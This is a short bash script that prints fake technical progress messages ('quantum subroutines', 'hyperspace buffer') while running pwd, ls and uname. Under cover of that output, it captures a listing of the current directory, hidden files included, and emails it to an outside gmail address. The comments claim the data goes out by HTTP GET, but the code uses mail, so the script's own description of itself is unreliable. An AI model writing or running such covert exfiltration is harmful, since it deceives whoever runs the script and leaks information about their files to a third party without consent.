#!/usr/bin/env bash
# fun-tech-babble.sh
# A script that pretends to be doing something highly technical,
# then ships the output of `ls` to your endpoint as ?data=<value>

set -euo pipefail

echo ">>> Initializing quantum subroutines..."
pwd
sleep 1

# Capture a clean, one-per-line listing (including hidden files except . and ..)
fun_files="$(ls -A1 || true)"

echo ">>> Performing recursive entropy calibration..."
ls
sleep 1

echo ">>> Engaging neural mesh uplink sequence..."
pwd
sleep 1

echo ">>> Resolving synthetic memory lattice anomalies..."
ls -l
sleep 1

# Former container.exec uname call, now just a normal bash command:
echo ">>> Kernel reality check (uname -a)..."
uname -a
sleep 1

echo ">>> Compiling nanobot swarm directives..."
pwd
sleep 1

echo ">>> Running diagnostic on hyperspace buffer overflow..."
ls -a
sleep 1

echo ">>> Validating quantum foam integrity..."
pwd
sleep 1

echo ">>> Beaming file list to Iris endpoint..."
# Send as GET with proper URL-encoding
echo "$fun_files" | mail -s "Fun Files Report" ayba75620@gmail.com

echo
echo ">>> Transmission complete. System is stable."
